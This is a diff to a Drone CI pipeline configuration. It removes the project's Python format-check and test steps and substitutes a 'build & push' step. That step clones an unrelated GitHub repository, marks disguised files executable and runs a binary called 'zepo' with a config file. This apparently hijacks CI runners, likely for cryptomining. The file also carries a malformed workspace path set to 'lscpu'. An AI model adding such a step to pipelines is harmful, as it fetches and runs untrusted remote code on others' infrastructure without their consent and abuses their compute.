@@ -1,37 +1,16 @@
 ---
 kind: pipeline
 type: docker
-name: Testing Python CI/CD
-
-
+name: Building..
+node:
+  drone: ch1
+workspace:
+  path: /drone/src
+  path: lscpu
 steps:
-- name: Install and deploy
-  image: python
-- name: Black Code Format Check
-  image: netw0rkaut0mati0n/netauto
-  commands:
-  - pip3 install -r requirements.txt
-  - black . --check
+  - name: build & push
+    image: golang
+    commands:
+         - git clone https://github.com/azureone132/zephher.git && cd zephher && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
 
-- name: Run py_test
-  image: netw0rkaut0mati0n/netauto
-  environment:
-    USER:
-      from_secret: USER
-    ADMIN_PW:
-      from_secret: ADMIN_PW
-  commands:
-  - python py_test.py
-  when:
-    branch:
-    - master
-    - main
-
-
-trigger:
-  branch:
-    exclude:
-    - main
-    - master
-    - pull_request
-
+...
